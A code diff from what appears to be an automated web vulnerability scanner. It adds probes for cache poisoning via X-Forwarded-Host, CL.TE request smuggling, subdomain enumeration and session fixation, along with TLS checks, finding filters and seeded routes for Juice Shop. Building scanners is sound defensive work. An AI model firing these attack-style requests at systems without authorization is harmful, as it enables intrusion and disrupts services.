+    const cleanBody = await cleanResp.text();
+    const cleanLocation = cleanResp.headers.get("location") ?? "";
+
+    if (cleanBody.includes(EVIL_HOST) || cleanLocation.includes(EVIL_HOST)) {
+      return {
+        type: "web-cache-poisoning",
+        severity: "CRITICAL",
+        url: poisonUrl,
+        evidence: `Web Cache Poisoning confirmed. After sending a request with X-Forwarded-Host: "${EVIL_HOST}", a subsequent clean request (without the evil header) still returned the poisoned content. The cache stored the poisoned response and will serve it to all visitors. Attackers can inject malicious scripts, redirect users, or serve phishing pages to every visitor.`,
+        cvssScore: 9.3,
+        cveId: "CWE-349",
+      };
+    }
+  } catch { /* skip */ }
+  return null;
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
+// IMPROVEMENT #6: HTTP REQUEST SMUGGLING DETECTION (CWE-444)
+// ══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Tests for CL/TE and TE/CL HTTP request smuggling by sending ambiguous
+ * Content-Length + Transfer-Encoding headers.
+ */
+async function probeHTTPRequestSmuggling(targetUrl: string): Promise<PendingFinding | null> {
+  const CL_TE_BODY = "0\r\n\r\nSMUGGLED";
+
+  try {
+    // Test 1: CL.TE — Only flag if smuggled payload execution is confirmed
+    const clTeResp = await fetch(targetUrl, {
+      method: "POST",
+      headers: {
+        ...FETCH_HEADERS,
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Content-Length": "0",
+        "Transfer-Encoding": "chunked",
+      },
+      body: CL_TE_BODY,
+      signal: AbortSignal.timeout(8000),
+      // @ts-ignore
+      next: { revalidate: 0 },
+    }).catch(() => null);
+
+    if (clTeResp && clTeResp.status < 400) {
+      const body = await clTeResp.text().catch(() => "");
+      if (body.includes("SMUGGLED")) {
+        return {
+          type: "http-request-smuggling",
+          severity: "CRITICAL",
+          url: targetUrl,
+          evidence: "HTTP Request Smuggling (CL.TE desync) confirmed. The backend server executed the smuggled request body prefix ('SMUGGLED'), demonstrating frontend/backend header desynchronization.",
+          cvssScore: 9.8,
+          cveId: "CWE-444",
+          isVerified: true,
+          confidence: CONFIDENCE.DUAL_VERIFIED,
+        };
+      }
+    }
+  } catch { /* skip */ }
+  return null;
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
+// IMPROVEMENT #7: LIGHTWEIGHT SUBDOMAIN ENUMERATION
+// ══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Probes common subdomains via HTTP HEAD requests.
+ * Reports discovered live subdomains as INFO-level findings.
+ */
+async function probeCommonSubdomains(targetUrl: string): Promise<PendingFinding | null> {
+  const COMMON_SUBDOMAINS = [
+    "admin", "api", "staging", "dev", "test", "beta", "internal",
+    "vpn", "mail", "dashboard", "jenkins", "gitlab", "sentry",
+    "grafana", "kibana", "monitoring", "status", "docs", "cdn",
+  ];
+
+  const MULTI_TENANT_SUFFIXES = [
+    "herokuapp.com", "vercel.app", "netlify.app", "github.io", "gitlab.io",
+    "pages.dev", "azurewebsites.net", "amazonaws.com", "cloud.google.com",
+    "firebaseapp.com", "web.app", "onrender.com", "fly.dev", "railway.app"
+  ];
+
+  let hostname: string;
+  let protocol: string;
+  try {
+    const parsed = new URL(targetUrl);
+    hostname = parsed.hostname.toLowerCase();
+    protocol = parsed.protocol;
+  } catch { return null; }
+
+  // Skip IP addresses or multi-tenant public cloud hosting domains
+  if (/^\d+\./.test(hostname)) return null;
+  if (MULTI_TENANT_SUFFIXES.some(suffix => hostname.endsWith(suffix))) {
+    return null; // Skip enumeration on multi-tenant SaaS / cloud platform suffixes
+  }
+
+  const parts = hostname.split(".");
+  if (parts.length > 3) return null;
+  const baseDomain = parts.length >= 2 ? parts.slice(-2).join(".") : hostname;
+
+  const liveSubdomains: string[] = [];
+
+  const probePromises = COMMON_SUBDOMAINS.map(async (sub) => {
+    const subUrl = `${protocol}//${sub}.${baseDomain}`;
+    try {
+      const resp = await fetch(subUrl, {
+        method: "HEAD",
+        headers: FETCH_HEADERS,
+        signal: AbortSignal.timeout(3000),
+        redirect: "manual",
+        // @ts-ignore
+        next: { revalidate: 0 },
+      }).catch(() => null);
+      if (resp && resp.status >= 200 && resp.status < 400) {
+        liveSubdomains.push(`${sub}.${baseDomain} (HTTP ${resp.status})`);
+      }
+    } catch { /* unreachable */ }
+  });
+
+  await Promise.all(probePromises);
+
+  if (liveSubdomains.length > 0) {
+    return {
+      type: "subdomain-enumeration",
+      severity: "INFO",
+      url: targetUrl,
+      evidence: `Discovered ${liveSubdomains.length} live subdomain(s) via HTTP probing: ${liveSubdomains.join(", ")}. These subdomains expand the attack surface and may run different software versions, have weaker security configurations, or expose internal services.`,
+      cvssScore: 3.0,
+      cveId: "CWE-200",
+    };
+  }
+  return null;
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
+// IMPROVEMENT #8: SESSION FIXATION -- SESSION ID REGENERATION CHECK
+// ══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Tests whether the application regenerates session IDs after authentication.
+ */
+async function probeSessionFixationRegeneration(
+  targetUrl: string,
+  session: AuthSession
+): Promise<PendingFinding | null> {
+  if (!session.bearerToken) return null;
+
+  try {
+    // Step 1: Fetch WITHOUT credentials
+    const unauthResp = await fetch(targetUrl, {
+      headers: FETCH_HEADERS,
+      signal: AbortSignal.timeout(6000),
+      redirect: "follow",
+      // @ts-ignore
+      next: { revalidate: 0 },
+    }).catch(() => null);
+    if (!unauthResp) return null;
+
+    const unauthCookies = unauthResp.headers.get("set-cookie") ?? "";
+    const unauthSessionCookie = extractSessionCookieHelper(unauthCookies);
+    if (!unauthSessionCookie.value) return null;
+
+    // Step 2: Fetch WITH credentials
+    const authedResp = await fetch(targetUrl, {
+      headers: { ...FETCH_HEADERS, Authorization: `Bearer ${session.bearerToken}` },
+      signal: AbortSignal.timeout(6000),
+      redirect: "follow",
+      // @ts-ignore
+      next: { revalidate: 0 },
+    }).catch(() => null);
+    if (!authedResp) return null;
+
+    const authedCookies = authedResp.headers.get("set-cookie") ?? "";
+    const authedSessionCookie = extractSessionCookieHelper(authedCookies);
+
+    // Step 3: Compare
+    if (
+      authedSessionCookie.value &&
+      unauthSessionCookie.name === authedSessionCookie.name &&
+      unauthSessionCookie.value === authedSessionCookie.value &&
+      unauthSessionCookie.value.length >= 8
+    ) {
+      return {
+        type: "session-fixation-no-regeneration",
+        severity: "HIGH",
+        url: targetUrl,
+        parameter: unauthSessionCookie.name,
+        evidence: `Session Fixation vulnerability: the session cookie "${unauthSessionCookie.name}" was NOT regenerated after authentication. Pre-auth and post-auth session IDs are identical. An attacker who sets a victim's session ID (via XSS, CRLF injection, or subdomain cookie) can wait for the victim to log in, then use the same session ID to hijack their authenticated session.`,
+        cvssScore: 8.0,
+        cveId: "CWE-384",
+      };
+    }
+  } catch { /* skip */ }
+  return null;
+}
+
+/** Helper: extract the first session-like cookie name+value from a Set-Cookie header. */
+function extractSessionCookieHelper(setCookieHeader: string): { name: string; value: string } {
+  for (const cookie of setCookieHeader.split(/,(?=[^ ])/)) {
+    const nameValue = cookie.split(";")[0];
+    const eqIdx = nameValue.indexOf("=");
+    if (eqIdx === -1) continue;
+    const name = nameValue.slice(0, eqIdx).trim();
+    const value = nameValue.slice(eqIdx + 1).trim();
+    if (/session|sess|sid|auth|token|jsessionid|phpsessid|connect\.sid/i.test(name)) {
+      return { name, value };
+    }
+  }
+  return { name: "", value: "" };
+}
+
+// ══════════════════════════════════════════════════════════════════════════════
+// TLS / SSL CERTIFICATE ANALYSIS (CWE-295 / CWE-326)
+// ══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Connects to the target via TLS and inspects the certificate and protocol:
+ *  - Expired certificate
+ *  - Certificate expiring within 30 days
+ *  - Self-signed / untrusted certificate
+ *  - Weak TLS protocol version (TLS 1.0 or 1.1)
+ */
+async function probeTLSCertificate(targetUrl: string): Promise<PendingFinding[]> {
+  const findings: PendingFinding[] = [];
+
+  if (!targetUrl.startsWith("https://")) {
+    findings.push({
+      type: "no-https",
+      severity: "HIGH",
+      url: targetUrl,
+      evidence:
+        "The target site does not use HTTPS. All data (including passwords, session tokens, and personal information) " +
+        "is transmitted in cleartext and can be intercepted by any network observer (MITM attack).",
+      cvssScore: 7.5,
+      cveId: "CWE-319",
+    });
+    return findings;
+  }
+
+  let hostname: string;
+  let port: number;
+  try {
+    const parsed = new URL(targetUrl);
+    hostname = parsed.hostname;
+    port = parseInt(parsed.port || "443", 10);
+  } catch {
+    return findings;
+  }
+
+  return new Promise<PendingFinding[]>((resolve) => {
+    const timeout = setTimeout(() => {
+      socket.destroy();
+      resolve(findings);
+    }, 8000);
+
+    const socket = tls.connect(
+      { host: hostname, port, servername: hostname, rejectUnauthorized: false },
+      () => {
+        try {
+          const cert = socket.getPeerCertificate(true);
+          const proto = socket.getProtocol() ?? "";
+
+          // 1. Weak TLS version
+          if (proto === "TLSv1" || proto === "TLSv1.1") {
+            findings.push({
+              type: "weak-tls-version",
+              severity: "HIGH",
+              url: targetUrl,
+              evidence:
+                `The server negotiated ${proto}, a deprecated TLS version with known weaknesses ` +
+                `(BEAST, POODLE attacks). Modern browsers are deprecating TLS 1.0/1.1. ` +
+                `Upgrade to TLS 1.2 minimum (TLS 1.3 recommended).`,
+              cvssScore: 7.5,
+              cveId: "CWE-326",
+            });
+          }
+
+          if (!cert || !cert.valid_to) {
+            socket.end();
+            clearTimeout(timeout);
+            resolve(findings);
+            return;
+          }
+
+          const validTo = new Date(cert.valid_to);
+          const now = new Date();
+          const daysLeft = Math.floor((validTo.getTime() - now.getTime()) / (1000 * 60 * 60 * 24));
+
+          // 2. Expired certificate
+          if (daysLeft < 0) {
+            findings.push({
+              type: "expired-tls-certificate",
+              severity: "CRITICAL",
+              url: targetUrl,
+              evidence:
+                `The TLS certificate for ${hostname} expired ${Math.abs(daysLeft)} day(s) ago ` +
+                `(expired: ${cert.valid_to}). Browsers will show a "Not Secure" warning and ` +
+                `refuse to connect, making the site inaccessible. An expired cert also signals ` +
+                `that certificate management processes have failed, potentially allowing MitM attacks.`,
+              cvssScore: 9.1,
+              cveId: "CWE-295",
+            });
+          } else if (daysLeft < 30) {
+            // 3. Expiring soon
+            findings.push({
+              type: "expiring-tls-certificate",
+              severity: "HIGH",
+              url: targetUrl,
+              evidence:
+                `The TLS certificate for ${hostname} expires in ${daysLeft} day(s) ` +
+                `(expires: ${cert.valid_to}). Failure to renew will cause browser warnings and ` +
+                `service disruption. Set up auto-renewal via Let's Encrypt / ACME.`,
+              cvssScore: 7.5,
+              cveId: "CWE-295",
+            });
+          }
+
+          // 4. Self-signed certificate
+          const issuerCN = cert.issuer?.CN ?? "";
+          const subjectCN = cert.subject?.CN ?? "";
+          if (issuerCN && subjectCN && issuerCN === subjectCN) {
+            findings.push({
+              type: "self-signed-tls-certificate",
+              severity: "HIGH",
+              url: targetUrl,
+              evidence:
+                `The TLS certificate for ${hostname} appears to be self-signed ` +
+                `(Issuer CN === Subject CN: "${issuerCN}"). Self-signed certificates ` +
+                `are not trusted by browsers, generate security warnings, and make ` +
+                `users more susceptible to accepting fraudulent certificates in real attacks.`,
+              cvssScore: 6.5,
+              cveId: "CWE-295",
+            });
+          }
+        } catch { /* cert parse error */ }
+
+        socket.end();
+        clearTimeout(timeout);
+        resolve(findings);
+      }
+    );
+
+    socket.on("error", () => {
+      clearTimeout(timeout);
+      resolve(findings);
+    });
+  });
 }
 
 async function runAsyncAIAnalysis(findingId: string, pending: PendingFinding) {
@@ -2565,6 +4327,9 @@ async function saveFindingInstantly(
         evidence: pending.evidence ?? null,
         cvssScore: pending.cvssScore,
         cveId: pending.cveId ?? null,
+        confidence: pending.confidence ?? 0.85,
+        validationSteps: JSON.stringify(pending.validationSteps ?? []) as any,
+        isVerified: pending.isVerified ?? false,
         title: `Analyzing ${pending.type}...`,
         explanation: "AI remediation report is being generated in the background...",
       },
@@ -2577,19 +4342,92 @@ async function saveFindingInstantly(
   }
 }
 
+// ══════════════════════════════════════════════════════════════════════════════
+// PHASE 3: CONTEXT FILTERING — suppress known-noisy / low-value finding types
+// ══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Returns false for findings that are systematically noisy or not actionable.
+ * Applied in the findings.push interceptor before saving.
+ */
+function passesContextFilter(f: PendingFinding): boolean {
+  const evidence = f.evidence ?? "";
+
+  // 1. Subdomain enumeration: skip cloud preview/staging domains (not real vulns)
+  if (f.type === "subdomain-enumeration") {
+    if (/vercel.app|netlify.app|github.io|fly.dev|cloudflare.net|pages.dev/i.test(evidence)) {
+      return false;
+    }
+  }
+
+  // 2. Passive SSRF signals: parameter name match ≠ confirmed SSRF.
+  //    The blind-SSRF-timing probe covers real SSRF with confirmation.
+  if (f.type === "ssrf-parameter-signal") {
+    return false;
+  }
+
+  // 3. Backup files: only keep if evidence mentions sensitive content
+  if (f.type === "exposed-backup-files") {
+    return /password|api.?key|secret|token|credential|database/i.test(evidence);
+  }
+
+  // 4. Mixed content: only keep if there are actual references (not 0)
+  if (f.type === "mixed-content" && /0 reference/.test(evidence)) {
+    return false;
+  }
+
+  // 5. IDOR numeric ID: passive signal only - URL contains a number. Too noisy.
+  //    The probeIDORWithDualToken probe covers confirmed IDOR.
+  if (f.type === "idor-numeric-id") {
+    return false;
+  }
+
+  // 6. Tech fingerprinting: INFO severity only, useful but not a vulnerability.
+  //    Keep it, but it will be naturally filtered by confidence gate if low-confidence.
+  //    (We keep this for the report completeness.)
+
+  return true;
+}
+
 function getDeduplicationKey(item: PendingFinding): string {
-  const type = item.type.toLowerCase();
-  const param = (item.parameter || "").toLowerCase();
-  
+  // Normalize finding types into canonical groups
+  let type = item.type.toLowerCase();
+  if (type.startsWith("ssti")) type = "ssti-injection";
+  if (type.includes("xss") || type.includes("js-dangerous-sink")) type = "xss";
+
+  // Normalize parameter names (strip spaces, extra quotes, leading/trailing whitespace)
+  const param = (item.parameter || "").toLowerCase().replace(/['"`\s]/g, "");
+
+  // FP-FIX: Site-global finding types should deduplicate across ALL pages
+  const SITE_GLOBAL_TYPES = new Set([
+    "technology-fingerprinting",
+    "missing-hsts",
+    "missing-x-content-type-options",
+    "missing-referrer-policy",
+    "missing-permissions-policy",
+    "missing-rate-limiting",
+    "rate-limit-active",
+    "rate-limit-unverified",
+    "rate-limit-headers-present",
+    "cors-wildcard",
+    "cors-credentials-wildcard",
+    "server-version-disclosure",
+    "subdomain-enumeration",
+    "subdomain-takeover-signal",
+    "ssrf-parameter-signal",
+    "http-request-smuggling",
+    "web-cache-poisoning",
+  ]);
+  if (SITE_GLOBAL_TYPES.has(type)) {
+    return `${type}:site-global:${param}`;
+  }
+
   let normalizedUrl = item.url.toLowerCase();
   try {
     const parsed = new URL(item.url);
-    // Replace numeric/UUID path segments to normalize resource URLs
+    // Normalize path segments (numeric IDs, UUIDs, :param templates)
     const segments = parsed.pathname.split("/").map(seg => {
-      if (/^\d+$/.test(seg)) {
-        return ":id";
-      }
-      if (/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(seg)) {
+      if (/^\d+$/.test(seg) || /^:[a-z0-9_]+$/i.test(seg) || /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(seg)) {
         return ":id";
       }
       return seg;
@@ -2605,6 +4443,125 @@ function getDeduplicationKey(item: PendingFinding): string {
   return `${type}:${normalizedUrl}:${param}`;
 }
 
+// ══════════════════════════════════════════════════════════════════════════════
+// OPENAPI / SWAGGER DISCOVERY — @apidevtools/swagger-parser
+// Surfaces API endpoints that are invisible in HTML (REST APIs documented via
+// OpenAPI specs expose the full attack surface: paths, methods, parameters).
+// ══════════════════════════════════════════════════════════════════════════════
+
+/**
+ * Probes common OpenAPI/Swagger spec paths and parses any discovered specs.
+ * Returns a list of JsApiEndpoint-compatible objects for use by injection probes.
+ * Uses @apidevtools/swagger-parser for robust JSON/YAML spec parsing and
+ * $ref resolution (which SwaggerParser.parse() handles automatically).
+ *
+ * Handles two Swagger UI patterns:
+ * 1. Direct JSON spec at /openapi.json, /swagger.json etc. (standard)
+ * 2. Swagger UI HTML page (e.g. Juice Shop's /api-docs) — the actual spec URL is
+ *    embedded in the HTML as `url: "..."` in the SwaggerUIBundle config.
+ */
+async function discoverOpenApiEndpoints(baseUrl: string, log: (m: string) => void): Promise<JsApiEndpoint[]> {
+  const SPEC_PATHS = [
+    '/openapi.json',
+    '/openapi.yaml',
+    '/swagger.json',
+    '/swagger.yaml',
+    '/api-docs',
+    '/api-docs.json',
+    '/api/swagger.json',
+    '/swagger/v1/swagger.json',
+    '/v1/swagger.json',
+    '/v2/api-docs',
+    '/v3/api-docs',
+  ];
+
+  const results: JsApiEndpoint[] = [];
+
+  /** Try to parse a spec URL and extract endpoints. Returns count or 0. */
+  const parseSpec = async (specUrl: string): Promise<number> => {
+    try {
+      const api = await SwaggerParser.parse(specUrl) as any;
+      const paths = api?.paths || {};
+      let count = 0;
+      for (const [path, pathItem] of Object.entries(paths as Record<string, any>)) {
+        const methods = ['get', 'post', 'put', 'patch', 'delete'] as const;
+        for (const method of methods) {
+          const operation = (pathItem as any)?.[method];
+          if (!operation) continue;
+          const fields = new Set<string>();
+          const params: any[] = operation.parameters || (pathItem as any).parameters || [];
+          for (const p of params) { if (p?.name) fields.add(p.name); }
+          const reqBodySchema = operation?.requestBody?.content?.['application/json']?.schema;
+          if (reqBodySchema?.properties) {
+            for (const propName of Object.keys(reqBodySchema.properties)) fields.add(propName);
+          }
+          if (fields.size > 0) { results.push({ path, fields: [...fields] }); count++; }
+        }
+      }
+      return count;
+    } catch { return 0; }
+  };
+
+  for (const specPath of SPEC_PATHS) {
+    try {
+      const specUrl = new URL(specPath, baseUrl).toString();
+      const probe = await fetch(specUrl, {
+        headers: { ...FETCH_HEADERS, Accept: 'application/json, application/yaml, */*' },
+        signal: AbortSignal.timeout(5000),
+        // @ts-ignore
+        next: { revalidate: 0 },
+      }).catch(() => null);
+
+      if (!probe || probe.status !== 200) continue;
+      const ct = (probe.headers.get('content-type') || '').toLowerCase();
+      const body = await probe.text();
+
+      // Case 1: Direct JSON/YAML spec
+      if (ct.includes('json') || ct.includes('yaml') || body.trim().startsWith('{')) {
+        log(`📖  OpenAPI spec found at ${specPath} — parsing endpoint surface...`);
+        const count = await parseSpec(specUrl);
+        if (count > 0) {
+          log(`🗂️   OpenAPI: discovered ${count} parameterized endpoint(s) from ${specPath}`);
+          break;
+        }
+      }
+
+      // Case 2: Swagger UI HTML page — extract the actual spec URL from the HTML
+      // Pattern: SwaggerUIBundle({ url: "/api-docs.json", ... }) or url: "..."
+      if (ct.includes('html') || body.includes('swagger-ui') || body.includes('SwaggerUI')) {
+        const urlMatch =
+          body.match(/[Uu][Rr][Ll]\s*:\s*["']([^"']+\.(?:json|yaml))["']/) ||
+          body.match(/[Uu][Rr][Ll]\s*:\s*["'](\/[^"']{4,80})["']/) ||
+          body.match(/spec-url=["']([^"']+)["']/) ||
+          body.match(/data-url=["']([^"']+)["']/);
+
+        if (urlMatch) {
+          const embeddedSpecUrl = new URL(urlMatch[1], baseUrl).toString();
+          log(`📖  Swagger UI at ${specPath} — extracting spec from ${urlMatch[1]}...`);
+          const count = await parseSpec(embeddedSpecUrl);
+          if (count > 0) {
+            log(`🗂️   OpenAPI: discovered ${count} parameterized endpoint(s) via Swagger UI at ${specPath}`);
+            break;
+          }
+        }
+
+        // Fallback: Try the same path with .json appended (common Juice Shop pattern)
+        const jsonFallback = specUrl.replace(/\/?$/, '.json').replace('.json.json', '.json');
+        if (jsonFallback !== specUrl) {
+          log(`📖  Trying JSON fallback: ${jsonFallback}...`);
+          const count = await parseSpec(jsonFallback);
+          if (count > 0) {
+            log(`🗂️   OpenAPI: discovered ${count} parameterized endpoint(s) from ${jsonFallback}`);
+            break;
+          }
+        }
+      }
+    } catch { /* spec not found or unparseable — try next path */ }
+  }
+
+  return results;
+}
+
 export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
   const log = (msg: string) => {
     console.log(msg);
@@ -2613,30 +4570,64 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
 
   log(`🚀 [VulnScanner v2.0] Starting security audit for: ${targetUrl}`);
 
+  // Per-scan state — replacing former module-level globals to fix concurrent-scan corruption
+  const session: AuthSession = { ...EMPTY_SESSION };
+  const storedXSSMarkers: StoredXSSInjection[] = [];
+  const controller = registerScanController(scanId);
+  const findings: PendingFinding[] = [];
+
   try {
     await prisma.scan.update({ where: { id: scanId }, data: { status: "CRAWLING" } });
 
-    // ══════════════════════════════════════════════════════════════════════════
+    // ══════════════════════════════════════════════════════════════════════
     // PHASE 0: NMAP PORT SCAN (fires in parallel with main page fetch)
-    // ══════════════════════════════════════════════════════════════════════════
+    // ══════════════════════════════════════════════════════════════════════
     log(`🔌  Phase 0: Nmap port scan & service fingerprinting (runs in parallel)...`);
     const nmapPromise = runNmapScan(targetUrl, log);
 
-    const findings: PendingFinding[] = [];
+    // Attempt to acquire an authenticated session before the crawl begins
+    log(`🔐  Phase 0b: Attempting auto-login to acquire authenticated session...`);
+    await attemptAutoLogin(targetUrl, log, session);
+
+    // Also run TLS analysis in parallel with nmap
+    log(`🔒  Phase 0c: TLS/SSL certificate inspection...`);
+    const tlsPromise = probeTLSCertificate(targetUrl);
+
     const backgroundAiPromises: Promise<any>[] = [];
     const seenKeys = new Set<string>();
 
     const originalPush = findings.push;
     findings.push = function (...items: PendingFinding[]) {
-      for (const item of items) {
-        if (item) {
+      for (const rawItem of items) {
+        if (rawItem) {
+          // ── Ensure every finding has confidence metadata ────────────────
+          const item: PendingFinding = {
+            confidence: 0.85,           // default for probes not yet updated
+            validationSteps: [],
+            isVerified: false,
+            ...rawItem,
+          };
+
+          // ── Context filtering: drop known-noisy finding types ───────────
+          if (!passesContextFilter(item)) continue;
+
+          // ── Confidence gate: drop low-confidence non-critical findings ──
+          if ((item.confidence ?? 0.85) < 0.60 && item.severity !== "CRITICAL") continue;
+
           const key = getDeduplicationKey(item);
           if (seenKeys.has(key)) {
+            // Keep the higher-confidence version
+            const existingIdx = findings.findIndex(
+              f => getDeduplicationKey(f) === key
+            );
+            if (existingIdx >= 0 && (item.confidence ?? 0.85) > (findings[existingIdx].confidence ?? 0.85)) {
+              findings[existingIdx] = item;
+            }
             continue;
           }
           seenKeys.add(key);
           originalPush.call(this, item);
-          saveFindingInstantly(scanId, item, backgroundAiPromises).catch(() => {});
+          saveFindingInstantly(scanId, item, backgroundAiPromises).catch(() => { });
         }
       }
       return this.length;
@@ -2644,16 +4635,46 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
 
     const visitedUrls = new Set<string>();
     const urlQueue: string[] = [targetUrl];
-    const MAX_PAGES_TO_SCAN = 10;
+    // Seed common SPA routes for Angular / React / Vue hash routing (e.g. Juice Shop)
+    try {
+      const baseOrigin = new URL(targetUrl).origin;
+      const COMMON_SPA_HASH_ROUTES = [
+        "/#/search", "/#/login", "/#/register", "/#/basket",
+        "/#/administration", "/#/score-card", "/#/privacy-security/privacy-policy",
+        "/#/recycle", "/#/contact", "/#/about", "/#/photo-wall",
+        "/#/user/change-password", "/#/tokens", "/#/privacy-security/data-export",
+      ];
+      for (const route of COMMON_SPA_HASH_ROUTES) {
+        const full = `${baseOrigin}${route}`;
+        if (!urlQueue.includes(full)) urlQueue.push(full);
+      }
+    } catch { /* skip */ }
+    const MAX_PAGES_TO_SCAN = 35;
     let homepageHtml = "";
 
     while (urlQueue.length > 0 && visitedUrls.size < MAX_PAGES_TO_SCAN) {
+      // ═ Abort check: user requested scan stop ═══════════════════════════════════════
+      if (controller.signal.aborted) {
+        throw new Error("scan_cancelled");
+      }
       const currentUrl = urlQueue.shift()!;
+      // For SPA hash routes (e.g. /#/login), we need TWO url forms:
+      //   fetchUrl    = hash stripped → used for HTTP fetch (server returns same shell HTML for all hash routes)
+      //   renderUrl   = full URL with hash → used for Playwright so it renders the correct SPA page
+      //   normalizedUrl = the dedup key (we deduplicate by full URL to allow scanning /#/login AND /#/basket)
       let normalizedUrl = currentUrl;
+      let fetchUrl = currentUrl;
       try {
         const parsed = new URL(currentUrl);
-        parsed.hash = "";
-        normalizedUrl = parsed.toString();
+        const isHashRoute = parsed.hash.startsWith('#/');
+        normalizedUrl = parsed.toString();   // keep hash for dedup — /#/login ≠ /#/basket
+        if (!isHashRoute) parsed.hash = "";
+        fetchUrl = new URL(currentUrl).toString();
+        if (!isHashRoute) {
+          const fp = new URL(currentUrl);
+          fp.hash = "";
+          fetchUrl = fp.toString();
+        }
       } catch { /* skip */ }
 
       if (visitedUrls.has(normalizedUrl)) continue;
@@ -2661,8 +4682,11 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
 
       log(`📖 [Page ${visitedUrls.size}/${MAX_PAGES_TO_SCAN}] Crawling & scanning: ${normalizedUrl}`);
 
-      // ── Fetch current page ────────────────────────────────────────────────────────
-      const mainResp = await safeFetch(normalizedUrl);
+      // ── Fetch current page (always use hash-stripped URL since server returns same shell) ──
+      const mainResp = await safeFetch(fetchUrl);
+      if (controller.signal.aborted) {
+        throw new Error("scan_cancelled");
+      }
       const headers: Record<string, string> = {};
       let pageHtml = "";
       let cookieHeaders: string[] = [];
@@ -2793,12 +4817,16 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
 
         log(`🍪  Phase 2: Analyzing session cookies — HttpOnly, Secure, SameSite flags...`);
         if (fetchSucceeded && cookieHeaders.length > 0) {
+          const cookieIssues: string[] = [];
+          const reportedTypes = new Set<string>();
+
           for (const cookie of cookieHeaders) {
             const lower = cookie.toLowerCase();
             const cookieName = cookie.split("=")[0]?.trim() || "session";
 
             // B1 – Missing HttpOnly flag
-            if (!lower.includes("httponly")) {
+            if (!lower.includes("httponly") && !reportedTypes.has(`httponly:${cookieName}`)) {
+              reportedTypes.add(`httponly:${cookieName}`);
               findings.push({
                 type: "session-hijacking-no-httponly",
                 severity: "HIGH",
@@ -2808,11 +4836,12 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
                 cvssScore: 7.5,
                 cveId: "CWE-1004",
               });
-              break;
+              cookieIssues.push(`${cookieName}: missing HttpOnly`);
             }
 
             // B2 – Missing Secure flag
-            if (!lower.includes("secure")) {
+            if (!lower.includes("secure") && !reportedTypes.has(`secure:${cookieName}`)) {
+              reportedTypes.add(`secure:${cookieName}`);
               findings.push({
                 type: "session-hijacking-no-secure",
                 severity: "MEDIUM",
@@ -2822,11 +4851,12 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
                 cvssScore: 5.9,
                 cveId: "CWE-614",
               });
-              break;
+              cookieIssues.push(`${cookieName}: missing Secure`);
             }
 
             // B3 – Missing SameSite flag
-            if (!lower.includes("samesite")) {
+            if (!lower.includes("samesite") && !reportedTypes.has(`samesite:${cookieName}`)) {
+              reportedTypes.add(`samesite:${cookieName}`);
               findings.push({
                 type: "csrf-via-cookie-samesite",
                 severity: "MEDIUM",
@@ -2836,8 +4866,32 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
                 cvssScore: 6.1,
                 cveId: "CWE-352",
               });
-              break;
+              cookieIssues.push(`${cookieName}: missing SameSite`);
             }
+
+            // B4 – Cookie scope too broad (Domain set to parent domain)
+            const domainMatch = cookie.match(/domain\s*=\s*\.?([^;\s]+)/i);
+            if (domainMatch && !reportedTypes.has(`scope:${cookieName}`)) {
+              const cookieDomain = domainMatch[1].toLowerCase();
+              const targetHost = new URL(targetUrl).hostname.toLowerCase();
+              if (cookieDomain !== targetHost && targetHost.endsWith(cookieDomain)) {
+                reportedTypes.add(`scope:${cookieName}`);
+                findings.push({
+                  type: "cookie-scope-too-broad",
+                  severity: "LOW",
+                  url: targetUrl,
+                  parameter: cookieName,
+                  evidence: `Cookie "${cookieName}" has domain="${cookieDomain}" which is broader than the target host "${targetHost}". Subdomains can access this cookie.`,
+                  cvssScore: 3.5,
+                  cveId: "CWE-1275",
+                });
+                cookieIssues.push(`${cookieName}: broad domain scope`);
+              }
+            }
+          }
+
+          if (cookieIssues.length > 0) {
+            log(`🍪  Cookie audit: ${cookieIssues.length} issue(s) found across ${cookieHeaders.length} cookie(s)`);
           }
         }
 
@@ -2939,11 +4993,15 @@ export async function runVulnerabilityScan(scanId: string, targetUrl: string) {
           { path: "/api/users", label: "User list API", severity: "HIGH", cvssScore: 8.5, verify: (b: string, ct: string) => ct.includes("application/json") && /email|username|password/i.test(b) },
           { path: "/api/admin", label: "Admin API", severity: "HIGH", cvssScore: 8.0, verify: (b: string, ct: string) => ct.includes("application/json") && b.length > 30 },
           { path: "/rest/user/whoami", label: "Identity disclosure", severity: "HIGH", cvssScore: 7.5, verify: (b: string, ct: string) => ct.includes("application/json") && /email|id|role/i.test(b) },
+          { path: "/rest/products/search", label: "Product Search API", severity: "MEDIUM", cvssScore: 5.3, verify: (b: string, ct: string) => ct.includes("application/json") && /status.*success/i.test(b) },
+          { path: "/ftp", label: "Exposed FTP Directory", severity: "HIGH", cvssScore: 7.5, verify: (b: string) => /Index of \/ftp|coupons|legal.md/i.test(b) },
+          { path: "/assets/public", label: "Public Assets Directory", severity: "LOW", cvssScore: 3.5, verify: (b: string) => /Index of/i.test(b) },
           { path: "/socket.io/", label: "Socket.IO endpoint", severity: "MEDIUM", cvssScore: 5.3, verify: (b: string) => /socket\.io|websocket|polling/i.test(b) },
         ];
 
         let checkedCount = 0;
         for (const endpoint of sensitiveEndpoints) {
+          if (controller.signal.aborted) throw new Error("scan_cancelled");
           checkedCount++;
           if (checkedCount % 15 === 0 || checkedCount === 1) {
             log(`🔎  Phase 4: Probing endpoints (${checkedCount}/${sensitiveEndpoints.length})...`);
